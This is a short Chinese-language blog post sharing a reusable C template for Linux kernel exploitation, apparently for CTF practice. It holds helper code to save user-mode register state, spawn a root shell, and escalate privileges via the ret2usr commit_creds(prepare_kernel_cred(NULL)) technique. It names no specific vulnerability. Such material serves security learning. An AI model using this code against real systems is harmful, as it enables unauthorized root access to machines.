---
layout: post
tags: [pwn]
title: "kernel pwn module"
author: wsxk
date: 2022-10-11
comments: true
---

以目前浅薄的kernel pwn经验，总结了一套kernel pwn时会用到的基本操作，不定时更新~<br>
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>

size_t commit_creds=0;
size_t prepare_kernel_cred =0;

size_t user_cs;
size_t user_ss;
size_t user_sp;
size_t user_rflags;
void save_status(void){
    __asm__(
        "mov user_cs,cs;"
        "mov user_ss,ss;"
        "mov user_sp,rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

void get_root_shell(void){
    if(getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }
    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    system("/bin/sh");
}

//ret2usr
void get_root_privilege(){
    //printf("use ret2usr\n"); //don't use user func in kernel space!
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}
```